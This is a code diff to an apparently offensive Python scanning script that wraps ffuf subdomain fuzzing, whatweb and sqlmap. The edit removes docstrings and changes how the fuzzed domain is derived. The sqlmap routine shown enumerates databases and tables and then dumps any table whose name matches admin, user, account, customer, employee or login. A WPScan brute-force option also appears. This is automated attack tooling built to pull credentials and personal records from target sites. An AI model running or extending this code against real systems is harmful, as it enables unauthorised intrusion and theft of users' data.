@@ -20,7 +20,6 @@ ENABLE_WPSCAN_BRUTEFORCE = False  # WPScan brute-force is disabled by default
 
 # ---------------- Banner ----------------
 def banner():
-    """Display the ASCII banner when the script starts"""
     print(r"""
 __________.__.__  .__           _________                     
 \____    /|__|  |  | _____   /   _____/ ____ _____    ____  
@@ -36,7 +35,6 @@ __________.__.__  .__           _________
 
 # ---------------- Check Dependencies ----------------
 def check_dependencies(tools):
-    """Ensure all required command-line tools are installed before starting"""
     missing = [tool for tool in tools if shutil.which(tool) is None]
     if missing:
         print(f"[!] Missing dependencies: {', '.join(missing)}. Please install them first.")
@@ -44,7 +42,6 @@ def check_dependencies(tools):
 
 # ---------------- Run Shell Command ----------------
 def run(cmd, desc, outfile=None, live_output=True):
-    """Execute a shell command and optionally save output"""
     try:
         print(f"\n[+] {desc}\n{'='*60}")
         output = ""
@@ -77,20 +74,10 @@ def run(cmd, desc, outfile=None, live_output=True):
 
 # ---------------- Helper Functions ----------------
 def extract_domain(url):
-    """Extract domain or host from a URL"""
     parsed = urlparse(url)
     return parsed.netloc or parsed.path
 
-def get_root_domain(url):
-    """Get the root domain (e.g., example.com from sub.example.com)"""
-    domain = extract_domain(url)
-    parts = domain.split(".")
-    if len(parts) >= 2:
-        return ".".join(parts[-2:])
-    return domain
-
 def clean_subdomains(file_path):
-    """Filter valid subdomains and remove duplicates"""
     valid_subdomain_regex = re.compile(r"^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$")
     cleaned = set()
     with open(file_path, "r", errors="ignore") as f:
@@ -108,12 +95,17 @@ def clean_subdomains(file_path):
 
 # ---------------- Tool Wrappers ----------------
 def run_ffuf(target, output_dir):
-    root_domain = get_root_domain(target)
+    # Correct domain extraction for FUZZ.target.com
+    parsed = urlparse(target)
+    domain = parsed.netloc
+    if domain.startswith("www."):
+        domain = domain[4:]
+
     ffuf_json_file = f"{output_dir}/ffuf_subdomains_{TIMESTAMP}.json"
     ffuf_txt_file  = f"{output_dir}/ffuf_subdomains_{TIMESTAMP}.txt"
     ffuf_wordlist  = "/usr/share/wordlists/dirb/common.txt"
 
-    cmd = f"ffuf -u http://FUZZ.{root_domain} -w {ffuf_wordlist} -t 40 -mc 200,301,302 -o {ffuf_json_file} -of json"
+    cmd = f"ffuf -u http://FUZZ.{domain} -w {ffuf_wordlist} -t 40 -mc 200,301,302 -o {ffuf_json_file} -of json"
     run(cmd, "Subdomain Fuzzing (FFUF)", outfile=None, live_output=False)
 
     try:
@@ -169,18 +161,14 @@ def run_whatweb(target, output_dir):
 
 # ---------------- Updated SQLMap Function ----------------
 def run_sqlmap(target, output_dir):
-    """Automate SQL injection discovery, enumeration, and selective dumping with SQLMap"""
     base_dir = f"{output_dir}/sqlmap_{TIMESTAMP}"
     os.makedirs(base_dir, exist_ok=True)
 
-    # Expanded regex for sensitive table names
     SENSITIVE_TABLES_REGEX = r"admin|admins|user|users|account|accounts|customer|customers|employee|employees|login|logins"
 
-    # Step 1: Enumerate databases
     enum_dbs_cmd = f"sqlmap -u {target} --batch --level=2 --risk=2 --threads=10 --random-agent --dbs --output-dir={base_dir}"
     run(enum_dbs_cmd, "SQLMap Database Enumeration", live_output=True)
 
-    # Step 2: Parse databases from .sqlite files
     dbs = []
     for root, dirs, files in os.walk(base_dir):
         for file in files:
@@ -189,7 +177,6 @@ def run_sqlmap(target, output_dir):
                 dbs.append(db_name)
     REPORT_DATA["sqlmap"]["databases"] = dbs
 
-    # Step 3: Enumerate tables for each database
     db_tables = {}
     for db in dbs:
         enum_tables_cmd = f"sqlmap -u {target} --batch -D {db} --tables --output-dir={base_dir}"
@@ -198,7 +185,6 @@ def run_sqlmap(target, output_dir):
         db_tables[db] = tables
     REPORT_DATA["sqlmap"]["tables"] = db_tables
 
-    # Step 4: Dump sensitive tables only
     for db, tables in db_tables.items():
         for table in tables:
             if re.search(SENSITIVE_TABLES_REGEX, table, re.IGNORECASE):
